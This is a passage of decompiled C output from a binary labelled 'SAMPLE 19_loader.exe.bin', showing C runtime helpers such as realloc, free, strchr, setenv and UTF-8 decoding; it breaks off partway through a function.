/* ===== SAMPLE 19_loader.exe.bin | RVA 0x20110 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140020110 rva=0x20110 */

void FUN_140020110(byte *param_1,byte *param_2)

{
  byte *pbVar1;
  byte bVar2;
  undefined8 local_38;
  undefined8 uStack_30;
  undefined8 local_28;
  undefined8 uStack_20;
  ulonglong local_18;
  
  local_18 = DAT_1400dfc40 ^ (ulonglong)&local_38;
  bVar2 = *param_2;
  local_38 = 0;
  uStack_30 = 0;
  local_28 = 0;
  uStack_20 = 0;
  while (bVar2 != 0) {
    pbVar1 = (byte *)((longlong)&local_38 + ((longlong)(int)(uint)bVar2 >> 3));
    *pbVar1 = *pbVar1 | '\x01' << (bVar2 & 7);
    pbVar1 = param_2 + 1;
    param_2 = param_2 + 1;
    bVar2 = *pbVar1;
  }
  bVar2 = *param_1;
  while( true ) {
    if (bVar2 == 0) {
      FUN_14001a2d0(local_18 ^ (ulonglong)&local_38);
      return;
    }
    if ((*(byte *)((longlong)&local_38 + (ulonglong)(bVar2 >> 3)) >> (bVar2 & 7) & 1) != 0) break;
    bVar2 = param_1[1];
    param_1 = param_1 + 1;
  }
  FUN_14001a2d0(local_18 ^ (ulonglong)&local_38);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x201ac | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400201ac rva=0x201ac */

void FUN_1400201ac(byte *param_1,byte *param_2)

{
  FUN_1400201b4(param_1,param_2,(undefined4 *)0x0);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x201b4 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400201b4 rva=0x201b4 */

byte * FUN_1400201b4(byte *param_1,byte *param_2,undefined4 *param_3)

{
  undefined8 *puVar1;
  byte *pbVar2;
  longlong local_28 [2];
  longlong local_18;
  char local_10;
  
  if ((param_1 == (byte *)0x0) || (param_2 == (byte *)0x0)) {
    puVar1 = FUN_140018dec();
    *(undefined4 *)puVar1 = 0x16;
    FUN_1400180c4();
  }
  else if (param_1 < param_2) {
    FUN_14001743c(local_28,param_3);
    pbVar2 = param_2 + -1;
    if (*(int *)(local_18 + 8) != 0) {
      do {
        pbVar2 = pbVar2 + -1;
        if (pbVar2 < param_1) break;
      } while ((*(byte *)((ulonglong)*pbVar2 + 0x19 + local_18) & 4) != 0);
      pbVar2 = param_2 + (-1 - (ulonglong)((int)param_2 - (int)pbVar2 & 1));
    }
    if (local_10 != '\0') {
      *(uint *)(local_28[0] + 0x3a8) = *(uint *)(local_28[0] + 0x3a8) & 0xfffffffd;
    }
    return pbVar2;
  }
  return (byte *)0x0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x20250 | verified_conservative_local_CFG_only ===== */
/* NORMAL INITIALIZATION CONTEXT ONLY. Original-byte conservative local CFG with statically derived loader TLS. Local computed-JMP targets are finite; PE-bound import tails and CFG guard dispatch are represented as tail calls. Unknown callee/store effects remain havoc. Actual indirect CALL targets and transitive behavior require separate evidence. Not original source, not a buildable project. Original instruction bytes unchanged. */

undefined8 FUN_140020250(longlong param_1)

{
  undefined8 *puVar1;
  undefined8 uVar2;
  
  if (param_1 == 0) {
    puVar1 = FUN_140018dec();
    *(undefined4 *)puVar1 = 0x16;
    FUN_1400180c4();
    return 0xffffffffffffffff;
  }
  uVar2 = HeapSize(DAT_1400e0d30,0,param_1);
  return uVar2;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x202a0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400202a0 rva=0x202a0 */

LPVOID FUN_1400202a0(LPVOID param_1,ulonglong param_2)

{
  bool bVar1;
  int iVar2;
  LPVOID pvVar3;
  undefined8 *puVar4;
  undefined7 extraout_var;
  
  if (param_1 == (LPVOID)0x0) {
    pvVar3 = FUN_140019a00(param_2);
  }
  else {
    if (param_2 == 0) {
      FUN_140017fb0(param_1);
    }
    else {
      if (param_2 < 0xffffffffffffffe1) {
        do {
          pvVar3 = HeapReAlloc(DAT_1400e0d30,0,param_1,param_2);
          if (pvVar3 != (LPVOID)0x0) {
            return pvVar3;
          }
          iVar2 = FUN_140015f20();
        } while ((iVar2 != 0) &&
                (bVar1 = FUN_140018520(param_2), (int)CONCAT71(extraout_var,bVar1) != 0));
      }
      puVar4 = FUN_140018dec();
      *(undefined4 *)puVar4 = 0xc;
    }
    pvVar3 = (LPVOID)0x0;
  }
  return pvVar3;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x20320 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140020320 rva=0x20320 */

char * FUN_140020320(ulonglong param_1,char param_2)

{
  uint uVar1;
  char *pcVar2;
  char *pcVar3;
  char *pcVar4;
  char *pcVar5;
  char *pcVar6;
  char *pcVar7;
  char *pcVar8;
  char *pcVar9;
  char *pcVar10;
  char *pcVar11;
  char *pcVar12;
  char *pcVar13;
  char *pcVar14;
  char *pcVar15;
  char *pcVar16;
  char *pcVar17;
  char *pcVar18;
  uint uVar19;
  undefined1 auVar20 [16];
  undefined1 in_XMM1 [16];
  undefined1 auVar21 [16];
  undefined1 auVar22 [16];
  undefined1 auVar23 [16];
  char cVar24;
  char cVar25;
  char cVar26;
  char cVar27;
  
  pcVar17 = (char *)(param_1 & 0xfffffffffffffff0);
  auVar21 = pshuflw(in_XMM1,ZEXT216(CONCAT11(param_2,param_2)),0);
  auVar23[0] = -(*pcVar17 == '\0');
  auVar23[1] = -(pcVar17[1] == '\0');
  auVar23[2] = -(pcVar17[2] == '\0');
  auVar23[3] = -(pcVar17[3] == '\0');
  auVar23[4] = -(pcVar17[4] == '\0');
  auVar23[5] = -(pcVar17[5] == '\0');
  auVar23[6] = -(pcVar17[6] == '\0');
  auVar23[7] = -(pcVar17[7] == '\0');
  auVar23[8] = -(pcVar17[8] == '\0');
  auVar23[9] = -(pcVar17[9] == '\0');
  auVar23[10] = -(pcVar17[10] == '\0');
  auVar23[0xb] = -(pcVar17[0xb] == '\0');
  auVar23[0xc] = -(pcVar17[0xc] == '\0');
  auVar23[0xd] = -(pcVar17[0xd] == '\0');
  auVar23[0xe] = -(pcVar17[0xe] == '\0');
  auVar23[0xf] = -(pcVar17[0xf] == '\0');
  cVar24 = auVar21[0];
  auVar20[0] = -(*pcVar17 == cVar24);
  cVar25 = auVar21[1];
  auVar20[1] = -(pcVar17[1] == cVar25);
  cVar26 = auVar21[2];
  auVar20[2] = -(pcVar17[2] == cVar26);
  cVar27 = auVar21[3];
  auVar20[3] = -(pcVar17[3] == cVar27);
  auVar20[4] = -(pcVar17[4] == cVar24);
  auVar20[5] = -(pcVar17[5] == cVar25);
  auVar20[6] = -(pcVar17[6] == cVar26);
  auVar20[7] = -(pcVar17[7] == cVar27);
  auVar20[8] = -(pcVar17[8] == cVar24);
  auVar20[9] = -(pcVar17[9] == cVar25);
  auVar20[10] = -(pcVar17[10] == cVar26);
  auVar20[0xb] = -(pcVar17[0xb] == cVar27);
  auVar20[0xc] = -(pcVar17[0xc] == cVar24);
  auVar20[0xd] = -(pcVar17[0xd] == cVar25);
  auVar20[0xe] = -(pcVar17[0xe] == cVar26);
  auVar20[0xf] = -(pcVar17[0xf] == cVar27);
  auVar20 = auVar20 | auVar23;
  uVar19 = (uint)(ushort)((ushort)(SUB161(auVar20 >> 7,0) & 1) |
                          (ushort)(SUB161(auVar20 >> 0xf,0) & 1) << 1 |
                          (ushort)(SUB161(auVar20 >> 0x17,0) & 1) << 2 |
                          (ushort)(SUB161(auVar20 >> 0x1f,0) & 1) << 3 |
                          (ushort)(SUB161(auVar20 >> 0x27,0) & 1) << 4 |
                          (ushort)(SUB161(auVar20 >> 0x2f,0) & 1) << 5 |
                          (ushort)(SUB161(auVar20 >> 0x37,0) & 1) << 6 |
                          (ushort)(SUB161(auVar20 >> 0x3f,0) & 1) << 7 |
                          (ushort)(SUB161(auVar20 >> 0x47,0) & 1) << 8 |
                          (ushort)(SUB161(auVar20 >> 0x4f,0) & 1) << 9 |
                          (ushort)(SUB161(auVar20 >> 0x57,0) & 1) << 10 |
                          (ushort)(SUB161(auVar20 >> 0x5f,0) & 1) << 0xb |
                          (ushort)(SUB161(auVar20 >> 0x67,0) & 1) << 0xc |
                          (ushort)(SUB161(auVar20 >> 0x6f,0) & 1) << 0xd |
                          (ushort)(SUB161(auVar20 >> 0x77,0) & 1) << 0xe |
                         (ushort)(byte)(auVar20[0xf] >> 7) << 0xf) & -1 << ((byte)param_1 & 0xf);
  while (uVar19 == 0) {
    pcVar18 = pcVar17 + 0x10;
    pcVar2 = pcVar17 + 0x11;
    pcVar3 = pcVar17 + 0x12;
    pcVar4 = pcVar17 + 0x13;
    pcVar5 = pcVar17 + 0x14;
    pcVar6 = pcVar17 + 0x15;
    pcVar7 = pcVar17 + 0x16;
    pcVar8 = pcVar17 + 0x17;
    pcVar9 = pcVar17 + 0x18;
    pcVar10 = pcVar17 + 0x19;
    pcVar11 = pcVar17 + 0x1a;
    pcVar12 = pcVar17 + 0x1b;
    pcVar13 = pcVar17 + 0x1c;
    pcVar14 = pcVar17 + 0x1d;
    pcVar15 = pcVar17 + 0x1e;
    pcVar16 = pcVar17 + 0x1f;
    pcVar17 = pcVar17 + 0x10;
    auVar21[0] = -(*pcVar18 == '\0');
    auVar21[1] = -(*pcVar2 == '\0');
    auVar21[2] = -(*pcVar3 == '\0');
    auVar21[3] = -(*pcVar4 == '\0');
    auVar21[4] = -(*pcVar5 == '\0');
    auVar21[5] = -(*pcVar6 == '\0');
    auVar21[6] = -(*pcVar7 == '\0');
    auVar21[7] = -(*pcVar8 == '\0');
    auVar21[8] = -(*pcVar9 == '\0');
    auVar21[9] = -(*pcVar10 == '\0');
    auVar21[10] = -(*pcVar11 == '\0');
    auVar21[0xb] = -(*pcVar12 == '\0');
    auVar21[0xc] = -(*pcVar13 == '\0');
    auVar21[0xd] = -(*pcVar14 == '\0');
    auVar21[0xe] = -(*pcVar15 == '\0');
    auVar21[0xf] = -(*pcVar16 == '\0');
    auVar22[0] = -(*pcVar18 == cVar24);
    auVar22[1] = -(*pcVar2 == cVar25);
    auVar22[2] = -(*pcVar3 == cVar26);
    auVar22[3] = -(*pcVar4 == cVar27);
    auVar22[4] = -(*pcVar5 == cVar24);
    auVar22[5] = -(*pcVar6 == cVar25);
    auVar22[6] = -(*pcVar7 == cVar26);
    auVar22[7] = -(*pcVar8 == cVar27);
    auVar22[8] = -(*pcVar9 == cVar24);
    auVar22[9] = -(*pcVar10 == cVar25);
    auVar22[10] = -(*pcVar11 == cVar26);
    auVar22[0xb] = -(*pcVar12 == cVar27);
    auVar22[0xc] = -(*pcVar13 == cVar24);
    auVar22[0xd] = -(*pcVar14 == cVar25);
    auVar22[0xe] = -(*pcVar15 == cVar26);
    auVar22[0xf] = -(*pcVar16 == cVar27);
    auVar22 = auVar22 | auVar21;
    uVar19 = (uint)(ushort)((ushort)(SUB161(auVar22 >> 7,0) & 1) |
                            (ushort)(SUB161(auVar22 >> 0xf,0) & 1) << 1 |
                            (ushort)(SUB161(auVar22 >> 0x17,0) & 1) << 2 |
                            (ushort)(SUB161(auVar22 >> 0x1f,0) & 1) << 3 |
                            (ushort)(SUB161(auVar22 >> 0x27,0) & 1) << 4 |
                            (ushort)(SUB161(auVar22 >> 0x2f,0) & 1) << 5 |
                            (ushort)(SUB161(auVar22 >> 0x37,0) & 1) << 6 |
                            (ushort)(SUB161(auVar22 >> 0x3f,0) & 1) << 7 |
                            (ushort)(SUB161(auVar22 >> 0x47,0) & 1) << 8 |
                            (ushort)(SUB161(auVar22 >> 0x4f,0) & 1) << 9 |
                            (ushort)(SUB161(auVar22 >> 0x57,0) & 1) << 10 |
                            (ushort)(SUB161(auVar22 >> 0x5f,0) & 1) << 0xb |
                            (ushort)(SUB161(auVar22 >> 0x67,0) & 1) << 0xc |
                            (ushort)(SUB161(auVar22 >> 0x6f,0) & 1) << 0xd |
                            (ushort)(SUB161(auVar22 >> 0x77,0) & 1) << 0xe |
                           (ushort)(byte)(auVar22[0xf] >> 7) << 0xf);
  }
  uVar1 = 0;
  if (uVar19 != 0) {
    for (; (uVar19 >> uVar1 & 1) == 0; uVar1 = uVar1 + 1) {
    }
  }
  pcVar18 = (char *)0x0;
  if (pcVar17[uVar1] == param_2) {
    pcVar18 = pcVar17 + uVar1;
  }
  return pcVar18;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x203b0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400203b0 rva=0x203b0 */

ulonglong FUN_1400203b0(byte *param_1,byte *param_2,ulonglong param_3)

{
  uint uVar1;
  int iVar2;
  ulonglong uVar3;
  longlong lVar4;
  undefined8 *puVar5;
  longlong lStack_20;
  longlong lStack_18;
  char cStack_10;
  
  if (DAT_1400e07f8 == 0) {
    FUN_140021420(param_1,param_2,param_3);
    uVar3 = FUN_14002053c();
    return uVar3;
  }
  cStack_10 = '\0';
  lVar4 = FUN_140016bc0();
  lStack_20 = *(longlong *)(lVar4 + 0x90);
  lStack_18 = *(longlong *)(lVar4 + 0x88);
  FUN_14001d0a4(lVar4,&lStack_20);
  FUN_14001d0d8(lVar4,&lStack_18);
  if ((*(uint *)(lVar4 + 0x3a8) & 2) == 0) {
    *(uint *)(lVar4 + 0x3a8) = *(uint *)(lVar4 + 0x3a8) | 2;
    cStack_10 = '\x01';
  }
  if (param_3 == 0) {
    if (cStack_10 != '\0') {
      *(uint *)(lVar4 + 0x3a8) = *(uint *)(lVar4 + 0x3a8) & 0xfffffffd;
    }
    uVar3 = 0;
  }
  else if ((param_1 == (byte *)0x0) || (param_2 == (byte *)0x0)) {
    puVar5 = FUN_140018dec();
    *(undefined4 *)puVar5 = 0x16;
    FUN_1400180c4();
    if (cStack_10 != '\0') {
      *(uint *)(lVar4 + 0x3a8) = *(uint *)(lVar4 + 0x3a8) & 0xfffffffd;
    }
    uVar3 = 0x7fffffff;
  }
  else {
    uVar3 = 0x7fffffff;
    if (param_3 < 0x80000000) {
      if (*(ushort **)(lStack_20 + 0x130) == (ushort *)0x0) {
        uVar1 = FUN_1400214b0(param_1,param_2,param_3,&lStack_20);
        if (cStack_10 != '\0') {
          *(uint *)(lVar4 + 0x3a8) = *(uint *)(lVar4 + 0x3a8) & 0xfffffffd;
        }
        return (ulonglong)uVar1;
      }
      iVar2 = FUN_140021644((undefined4 *)&lStack_20,*(ushort **)(lStack_20 + 0x130),0x1001,param_1,
                            (int)param_3,param_2,(int)param_3,*(UINT *)(lStack_20 + 0x14));
      if (iVar2 == 0) {
        puVar5 = FUN_140018dec();
        *(undefined4 *)puVar5 = 0x16;
      }
      else {
        uVar3 = (ulonglong)(iVar2 - 2);
      }
    }
    else {
      puVar5 = FUN_140018dec();
      *(undefined4 *)puVar5 = 0x16;
      FUN_1400180c4();
    }
    if (cStack_10 != '\0') {
      *(uint *)(lVar4 + 0x3a8) = *(uint *)(lVar4 + 0x3a8) & 0xfffffffd;
    }
  }
  return uVar3;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x203e3 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400203e3 rva=0x203e3 */

int FUN_1400203e3(void)

{
  uint *puVar1;
  ushort *puVar2;
  int iVar3;
  int iVar4;
  longlong lVar5;
  undefined8 *puVar6;
  char cVar7;
  longlong unaff_RBP;
  byte *unaff_RSI;
  ulonglong unaff_RDI;
  byte *unaff_R14;
  
  *(undefined1 *)(unaff_RBP + -8) = 0;
  lVar5 = FUN_140016bc0();
  *(longlong *)(unaff_RBP + -0x20) = lVar5;
  *(undefined8 *)(unaff_RBP + -0x18) = *(undefined8 *)(lVar5 + 0x90);
  *(undefined8 *)(unaff_RBP + -0x10) = *(undefined8 *)(lVar5 + 0x88);
  FUN_14001d0a4(lVar5,(longlong *)(unaff_RBP + -0x18));
  FUN_14001d0d8(*(longlong *)(unaff_RBP + -0x20),(longlong *)(unaff_RBP + -0x10));
  lVar5 = *(longlong *)(unaff_RBP + -0x20);
  if ((*(uint *)(lVar5 + 0x3a8) & 2) == 0) {
    *(uint *)(lVar5 + 0x3a8) = *(uint *)(lVar5 + 0x3a8) | 2;
    cVar7 = '\x01';
    lVar5 = *(longlong *)(unaff_RBP + -0x20);
    *(undefined1 *)(unaff_RBP + -8) = 1;
  }
  else {
    cVar7 = *(char *)(unaff_RBP + -8);
  }
  if (unaff_RDI == 0) {
    if (cVar7 != '\0') {
      *(uint *)(lVar5 + 0x3a8) = *(uint *)(lVar5 + 0x3a8) & 0xfffffffd;
    }
    iVar3 = 0;
  }
  else if ((unaff_R14 == (byte *)0x0) || (unaff_RSI == (byte *)0x0)) {
    puVar6 = FUN_140018dec();
    *(undefined4 *)puVar6 = 0x16;
    FUN_1400180c4();
    if (*(char *)(unaff_RBP + -8) != '\0') {
      puVar1 = (uint *)(*(longlong *)(unaff_RBP + -0x20) + 0x3a8);
      *puVar1 = *puVar1 & 0xfffffffd;
    }
    iVar3 = 0x7fffffff;
  }
  else {
    iVar3 = 0x7fffffff;
    if (unaff_RDI < 0x80000000) {
      puVar2 = *(ushort **)(*(longlong *)(unaff_RBP + -0x18) + 0x130);
      if (puVar2 == (ushort *)0x0) {
        iVar3 = FUN_1400214b0(unaff_R14,unaff_RSI,unaff_RDI,(undefined8 *)(unaff_RBP + -0x18));
        if (*(char *)(unaff_RBP + -8) != '\0') {
          puVar1 = (uint *)(*(longlong *)(unaff_RBP + -0x20) + 0x3a8);
          *puVar1 = *puVar1 & 0xfffffffd;
        }
        return iVar3;
      }
      iVar4 = FUN_140021644((undefined4 *)(unaff_RBP + -0x18),puVar2,0x1001,unaff_R14,(int)unaff_RDI
                            ,unaff_RSI,(int)unaff_RDI,
                            *(UINT *)(*(longlong *)(unaff_RBP + -0x18) + 0x14));
      if (iVar4 == 0) {
        puVar6 = FUN_140018dec();
        *(undefined4 *)puVar6 = 0x16;
      }
      else {
        iVar3 = iVar4 + -2;
      }
    }
    else {
      puVar6 = FUN_140018dec();
      *(undefined4 *)puVar6 = 0x16;
      FUN_1400180c4();
    }
    if (*(char *)(unaff_RBP + -8) != '\0') {
      puVar1 = (uint *)(*(longlong *)(unaff_RBP + -0x20) + 0x3a8);
      *puVar1 = *puVar1 & 0xfffffffd;
    }
  }
  return iVar3;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x2053c | no_partial_markers_not_a_CFG_proof ===== */
/* address=14002053c rva=0x2053c */

void FUN_14002053c(void)

{
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x20554 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140020554 rva=0x20554 */

BOOL FUN_140020554(LPCSTR param_1,LPCSTR param_2)

{
  uint uVar1;
  BOOL BVar2;
  INT_PTR IVar3;
  UINT UVar4;
  LPCWSTR pWVar5;
  UINT UVar6;
  undefined1 local_res18 [8];
  longlong local_98;
  longlong local_90;
  char local_80;
  undefined8 local_78;
  undefined8 local_70;
  LPCWSTR local_68;
  undefined8 local_60;
  undefined8 local_58;
  char local_50;
  undefined8 local_48;
  undefined8 local_40;
  LPCWSTR local_38;
  undefined8 local_30;
  undefined8 local_28;
  char local_20;
  
  local_48 = 0;
  local_40 = 0;
  local_38 = (LPCWSTR)0x0;
  local_30 = 0;
  local_28 = 0;
  local_20 = '\0';
  local_78 = 0;
  local_70 = 0;
  local_68 = (LPCWSTR)0x0;
  local_60 = 0;
  local_58 = 0;
  local_50 = '\0';
  FUN_14001743c(&local_98,(undefined4 *)0x0);
  UVar4 = 0xfde9;
  if (*(int *)(local_90 + 0xc) == 0xfde9) {
    if (local_80 != '\0') {
      *(uint *)(local_98 + 0x3a8) = *(uint *)(local_98 + 0x3a8) & 0xfffffffd;
    }
    UVar6 = 0xfde9;
  }
  else {
    IVar3 = FUN_14001650c();
    if ((int)IVar3 == 0) {
      if (local_80 != '\0') {
        *(uint *)(local_98 + 0x3a8) = *(uint *)(local_98 + 0x3a8) & 0xfffffffd;
      }
      UVar6 = 1;
    }
    else {
      if (local_80 != '\0') {
        *(uint *)(local_98 + 0x3a8) = *(uint *)(local_98 + 0x3a8) & 0xfffffffd;
      }
      UVar6 = 0;
    }
  }
  uVar1 = FUN_14001a534(param_1,(longlong)&local_48,local_res18,UVar6);
  pWVar5 = (LPCWSTR)0x0;
  if (uVar1 == 0) {
    FUN_14001743c(&local_98,(undefined4 *)0x0);
    if (*(int *)(local_90 + 0xc) == 0xfde9) {
      if (local_80 != '\0') {
        *(uint *)(local_98 + 0x3a8) = *(uint *)(local_98 + 0x3a8) & 0xfffffffd;
      }
    }
    else {
      IVar3 = FUN_14001650c();
      if ((int)IVar3 == 0) {
        if (local_80 != '\0') {
          *(uint *)(local_98 + 0x3a8) = *(uint *)(local_98 + 0x3a8) & 0xfffffffd;
        }
        UVar4 = 1;
      }
      else {
        if (local_80 != '\0') {
          *(uint *)(local_98 + 0x3a8) = *(uint *)(local_98 + 0x3a8) & 0xfffffffd;
        }
        UVar4 = 0;
      }
    }
    uVar1 = FUN_14001a534(param_2,(longlong)&local_78,local_res18,UVar4);
    pWVar5 = local_68;
    if (uVar1 == 0) {
      BVar2 = SetEnvironmentVariableW(local_38,local_68);
      goto LAB_1400206b7;
    }
  }
  BVar2 = 0;
LAB_1400206b7:
  if (local_50 != '\0') {
    FUN_140017fb0(pWVar5);
  }
  if (local_20 != '\0') {
    FUN_140017fb0(local_38);
  }
  return BVar2;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x20700 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140020700 rva=0x20700 */

void thunk_FUN_140017fb0(LPVOID param_1)

{
  BOOL BVar1;
  DWORD DVar2;
  uint uVar3;
  uint *puVar4;
  
  if ((param_1 != (LPVOID)0x0) && (BVar1 = HeapFree(DAT_1400e0d30,0,param_1), BVar1 == 0)) {
    DVar2 = GetLastError();
    uVar3 = FUN_140018e5c(DVar2);
    puVar4 = (uint *)FUN_140018dec();
    *puVar4 = uVar3;
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x20708 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140020708 rva=0x20708 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

int FUN_140020708(LPWSTR param_1,byte *param_2,ulonglong param_3,longlong *param_4)

{
  UINT UVar1;
  longlong *plVar2;
  int iVar3;
  
  if ((param_2 == (byte *)0x0) || (param_3 == 0)) {
    _DAT_1400e11d8 = 0;
  }
  else {
    if (*param_2 != 0) {
      if ((char)param_4[5] == '\0') {
        FUN_14001bad0(param_4);
      }
      plVar2 = (longlong *)param_4[3];
      UVar1 = *(UINT *)((longlong)plVar2 + 0xc);
      if (UVar1 == 0xfde9) {
        iVar3 = FUN_140020a78(param_1,param_2,param_3,(uint *)&DAT_1400e11d8,(longlong)param_4);
        if (iVar3 < 0) {
          return -1;
        }
        return iVar3;
      }
      if (plVar2[0x27] == 0) {
        if (param_1 != (LPWSTR)0x0) {
          *param_1 = (ushort)*param_2;
        }
        return 1;
      }
      if (*(short *)(*plVar2 + (ulonglong)*param_2 * 2) < 0) {
        iVar3 = (int)plVar2[1];
        if ((((1 < iVar3) && (iVar3 <= (int)param_3)) &&
            (iVar3 = FUN_140019c24(UVar1,9,(LPCSTR)param_2,iVar3,param_1,
                                   (uint)(param_1 != (LPWSTR)0x0)), iVar3 != 0)) ||
           (((ulonglong)(longlong)*(int *)(param_4[3] + 8) <= param_3 && (param_2[1] != 0)))) {
          return *(int *)(param_4[3] + 8);
        }
      }
      else {
        iVar3 = FUN_140019c24(UVar1,9,(LPCSTR)param_2,1,param_1,(uint)(param_1 != (LPWSTR)0x0));
        if (iVar3 != 0) {
          return 1;
        }
      }
      *(undefined1 *)(param_4 + 6) = 1;
      *(undefined4 *)((longlong)param_4 + 0x2c) = 0x2a;
      return -1;
    }
    if (param_1 != (LPWSTR)0x0) {
      *param_1 = L'\0';
    }
  }
  return 0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x20880 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140020880 rva=0x20880 */

ulonglong FUN_140020880(byte *param_1)

{
  byte bVar1;
  ulonglong uVar2;
  
  bVar1 = *param_1;
  if (-1 < (char)bVar1) {
    return (ulonglong)(bVar1 != 0);
  }
  if ((bVar1 & 0xe0) == 0xc0) {
    return 2;
  }
  if ((bVar1 & 0xf0) == 0xe0) {
    return 3;
  }
  uVar2 = 0xffffffff;
  if ((bVar1 & 0xf8) == 0xf0) {
    uVar2 = 4;
  }
  return uVar2;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x208b8 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400208b8 rva=0x208b8 */

void FUN_1400208b8(ulonglong param_1,byte *param_2,ulonglong param_3,uint *param_4,longlong param_5)

{
  byte bVar1;
  ulonglong uVar2;
  ulonglong uVar3;
  uint uVar4;
  uint *puVar5;
  byte *pbVar6;
  byte bVar7;
  ulonglong uVar8;
  ulonglong uVar9;
  uint *puVar10;
  undefined1 auStack_78 [24];
  uint auStack_60 [6];
  ulonglong local_48;
  
  local_48 = DAT_1400dfc40 ^ (ulonglong)auStack_78;
  puVar5 = (uint *)&DAT_1400e11e0;
  if (param_4 != (uint *)0x0) {
    puVar5 = param_4;
  }
  pbVar6 = &DAT_140090894;
  uVar2 = 1;
  if (param_2 != (byte *)0x0) {
    pbVar6 = param_2;
    uVar2 = param_3;
  }
  puVar10 = (uint *)(-(ulonglong)(param_2 != (byte *)0x0) & param_1);
  if (uVar2 == 0) goto LAB_140020a59;
  if (*(short *)((longlong)puVar5 + 6) == 0) {
    uVar3 = FUN_140020880(pbVar6);
    uVar4 = (uint)uVar3;
    uVar8 = (ulonglong)(int)uVar4;
    bVar1 = *pbVar6;
    pbVar6 = pbVar6 + 1;
    if (uVar4 < 2) {
      if (puVar10 != (uint *)0x0) {
        *puVar10 = (uint)bVar1;
      }
      goto LAB_140020a59;
    }
    if (uVar4 - 2 < 3) {
      bVar7 = (byte)uVar3;
      uVar4 = (1 << (7 - bVar7 & 0x1f)) - 1U & (uint)bVar1;
      goto LAB_1400209a5;
    }
  }
  else {
    bVar1 = (byte)puVar5[1];
    uVar8 = (ulonglong)bVar1;
    uVar4 = *puVar5;
    bVar7 = *(byte *)((longlong)puVar5 + 6);
    if ((((byte)(bVar1 - 2) < 3) && (bVar7 != 0)) && (bVar7 < bVar1)) {
LAB_1400209a5:
      uVar9 = (ulonglong)bVar7;
      uVar3 = uVar9;
      if (uVar2 <= uVar9) {
        uVar3 = uVar2;
      }
      while ((ulonglong)((longlong)pbVar6 - (longlong)param_2) < uVar3) {
        bVar1 = *pbVar6;
        pbVar6 = pbVar6 + 1;
        if ((bVar1 & 0xc0) != 0x80) goto LAB_140020a4e;
        uVar4 = bVar1 & 0x3f | uVar4 << 6;
      }
      if (uVar3 < uVar9) {
        *(ushort *)(puVar5 + 1) = (ushort)uVar8 & 0xff;
        *(ushort *)((longlong)puVar5 + 6) = (ushort)(byte)(bVar7 - (char)uVar3);
        *puVar5 = uVar4;
        goto LAB_140020a59;
      }
      if ((0x7ff < uVar4 - 0xd800) && (uVar4 < 0x110000)) {
        auStack_60[2] = 0x80;
        auStack_60[3] = 0x800;
        auStack_60[4] = 0x10000;
        if (auStack_60[uVar8 & 0xff] <= uVar4) {
          if (puVar10 != (uint *)0x0) {
            *puVar10 = uVar4;
          }
          FUN_140021a74(-(ulonglong)(uVar4 != 0) & uVar9,(undefined8 *)puVar5);
          goto LAB_140020a59;
        }
      }
    }
  }
LAB_140020a4e:
  FUN_140021a60((undefined8 *)puVar5,param_5);
LAB_140020a59:
  FUN_14001a2d0(local_48 ^ (ulonglong)auStack_78);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x20a78 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140020a78 rva=0x20a78 */

void FUN_140020a78(undefined2 *param_1,byte *param_2,ulonglong param_3,uint *param_4,
                  longlong param_5)

{
  ulonglong uVar1;
  uint local_18 [4];
  
  local_18[0] = 0;
  uVar1 = FUN_1400208b8((ulonglong)local_18,param_2,param_3,param_4,param_5);
  if (uVar1 < 5) {
    if (0xffff < local_18[0]) {
      local_18[0] = 0xfffd;
    }
    if (param_1 != (undefined2 *)0x0) {
      *param_1 = (short)local_18[0];
    }
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x20ac0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140020ac0 rva=0x20ac0 */

longlong FUN_140020ac0(ushort *param_1,undefined8 *param_2,ulonglong param_3,uint *param_4,
                      longlong param_5)

{
  longlong lVar1;
  longlong lVar2;
  longlong lVar3;
  ushort *puVar4;
  byte *pbVar5;
  ulonglong uVar6;
  uint local_res8 [2];
  
  pbVar5 = (byte *)*param_2;
  puVar4 = param_1;
  if (param_1 == (ushort *)0x0) {
    lVar1 = 0;
    while( true ) {
      if (*pbVar5 == 0) {
        uVar6 = 1;
      }
      else if (pbVar5[1] == 0) {
        uVar6 = 2;
      }
      else {
        uVar6 = (ulonglong)(pbVar5[2] != 0) + 3;
      }
      lVar2 = FUN_1400208b8(0,pbVar5,uVar6,param_4,param_5);
      if (lVar2 == -1) {
        *(undefined1 *)(param_5 + 0x30) = 1;
        *(undefined4 *)(param_5 + 0x2c) = 0x2a;
        return -1;
      }
      if (lVar2 == 0) break;
      pbVar5 = pbVar5 + lVar2;
      lVar3 = lVar1 + 1;
      if (lVar2 != 4) {
        lVar3 = lVar1;
      }
      lVar1 = lVar3 + 1;
    }
  }
  else {
    for (; param_3 != 0; param_3 = param_3 - 1) {
      if (*pbVar5 == 0) {
        uVar6 = 1;
      }
      else if (pbVar5[1] == 0) {
        uVar6 = 2;
      }
      else {
